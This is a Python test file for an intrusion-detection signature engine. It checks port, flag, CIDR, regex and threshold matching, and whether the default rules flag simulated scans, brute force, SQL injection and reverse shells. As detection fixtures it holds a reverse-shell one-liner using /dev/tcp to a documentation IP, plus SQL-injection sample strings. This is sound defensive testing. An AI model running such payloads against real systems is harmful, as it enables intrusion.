"""Signature engine: match primitives, thresholds and the shipped default rules."""
from __future__ import annotations

import re
from itertools import count
from pathlib import Path

import pytest
import yaml

from app.engine.packet import Packet
from app.engine.signatures import CompiledRule, SignatureEngine
from app.engine.sniffer import TrafficSimulator
from helpers import is_documentation_ip, noop_handler

RULES_FILE = Path(__file__).resolve().parents[1] / "data" / "rules" / "default_rules.yaml"
_rule_ids = count(1)


def engine_with(*matches: dict) -> SignatureEngine:
    engine = SignatureEngine()
    engine.load(
        CompiledRule(id=next(_rule_ids), name=f"rule-{i}", category="test",
                     severity="low", action="alert", match=m)
        for i, m in enumerate(matches)
    )
    return engine


def packet(**overrides) -> Packet:
    fields = dict(protocol="TCP", src_ip="198.51.100.7", src_port=40000,
                  dst_ip="10.0.0.10", dst_port=80, length=60, flags="S")
    fields.update(overrides)
    return Packet(**fields)


def default_rules_engine() -> SignatureEngine:
    rules = yaml.safe_load(RULES_FILE.read_text(encoding="utf-8"))
    engine = SignatureEngine()
    engine.load(
        CompiledRule(id=i, name=r["name"], category=r["category"], severity=r["severity"],
                     action=r["action"], match=r["match"], description=r.get("description"))
        for i, r in enumerate(rules, start=1)
    )
    return engine


# --------------------------------------------------------------------------- #
# Match primitives                                                             #
# --------------------------------------------------------------------------- #
def test_protocol_must_match():
    assert engine_with({"protocol": "udp"}).evaluate(packet()) == []
    assert len(engine_with({"protocol": "tcp"}).evaluate(packet())) == 1


@pytest.mark.parametrize("spec, port, expected", [
    (22, 22, True),
    (22, 23, False),
    ("80-8080", 443, True),
    ("80-8080", 9000, False),
    ([22, 80], 80, True),
    ("any", 1234, True),
])
def test_destination_port_specs(spec, port, expected):
    hits = engine_with({"dst_port": spec}).evaluate(packet(dst_port=port))
    assert bool(hits) is expected


def test_flags_must_all_be_set():
    syn_only = engine_with({"flags": ["S"]})
    assert syn_only.evaluate(packet(flags="S"))
    assert not syn_only.evaluate(packet(flags="A,P"))

    syn_ack = engine_with({"flags": ["S", "A"]})
    assert syn_ack.evaluate(packet(flags="S,A"))
    assert not syn_ack.evaluate(packet(flags="S"))


def test_content_match_is_case_insensitive():
    engine = engine_with({"content": "/BIN/SH"})
    assert engine.evaluate(packet(payload=b"/bin/sh -i >& /dev/tcp/203.0.113.66/4444"))
    assert not engine.evaluate(packet(payload=b"GET / HTTP/1.1"))


def test_regex_from_default_sqli_rule():
    engine = engine_with({"regex": r"(?i)(union\s+select|or\s+1=1|information_schema|' or '1'='1)"})
    assert engine.evaluate(packet(payload=b"GET /login.php?user=admin' OR '1'='1 HTTP/1.1"))
    assert not engine.evaluate(packet(payload=b"GET /index.html HTTP/1.1"))


def test_cidr_source_match():
    assert engine_with({"src_ip": "198.51.100.0/24"}).evaluate(packet())
    assert not engine_with({"src_ip": "10.0.0.0/8"}).evaluate(packet())


def test_min_length():
    engine = engine_with({"protocol": "udp", "min_length": 1400})
    assert engine.evaluate(packet(protocol="UDP", flags="", length=1500))
    assert not engine.evaluate(packet(protocol="UDP", flags="", length=512))


def test_alert_payload_shape():
    (alert,) = engine_with({"protocol": "tcp"}).evaluate(packet())
    assert alert["detection_method"] == "signature"
    assert alert["src_ip"] == "198.51.100.7" and alert["dst_port"] == 80


# --------------------------------------------------------------------------- #
# Thresholds                                                                   #
# --------------------------------------------------------------------------- #
def test_threshold_fires_n_minus_c_plus_1_times():
    """Thesis Ch. 6: a burst of N packets against a count-c threshold fires N - c + 1 alerts."""
    engine = engine_with({"flags": ["S"], "threshold": {"count": 5, "seconds": 10, "track": "src_ip"}})
    fired = sum(len(engine.evaluate(packet())) for _ in range(8))
    assert fired == 8 - 5 + 1


def test_threshold_is_tracked_per_source():
    engine = engine_with({"flags": ["S"], "threshold": {"count": 5, "seconds": 10, "track": "src_ip"}})
    fired = 0
    for _ in range(4):
        fired += len(engine.evaluate(packet(src_ip="198.51.100.1")))
        fired += len(engine.evaluate(packet(src_ip="198.51.100.2")))
    assert fired == 0


# --------------------------------------------------------------------------- #
# Default rules vs. the simulator's traffic                                    #
# --------------------------------------------------------------------------- #
EXPECTED_RULE = {
    "nmap":          "Nmap TCP SYN scan",
    "ssh_brute":     "SSH brute-force attempt",
    "icmp_flood":    "ICMP flood (ping sweep)",
    "sqli":          "HTTP SQL injection pattern",
    "cmd_inject":    "Possible command injection in HTTP",
    "reverse_shell": "Reverse shell handshake (/bin/sh)",
}


@pytest.mark.parametrize("kind, rule_name", EXPECTED_RULE.items())
def test_each_simulated_attack_trips_its_default_rule(kind, rule_name):
    engine = default_rules_engine()
    sim = TrafficSimulator(handler=noop_handler)
    burst = sim._factories[kind]("203.0.113.66")
    packets = burst if isinstance(burst, list) else [burst]
    fired = {a["rule_name"] for p in packets for a in engine.evaluate(p)}
    assert rule_name in fired


def test_benign_traffic_trips_no_default_rule():
    engine = default_rules_engine()
    sim = TrafficSimulator(handler=noop_handler)
    assert [a for _ in range(1000) for a in engine.evaluate(sim._benign())] == []


def test_simulated_attackers_use_documentation_addresses():
    assert all(is_documentation_ip(ip) for ip in TrafficSimulator.ATTACKERS)
    shell = TrafficSimulator(handler=noop_handler)._reverse_shell("192.0.2.45")
    (callback_ip,) = re.findall(rb"/dev/tcp/([\d.]+)/", shell.payload)
    assert is_documentation_ip(callback_ip.decode())
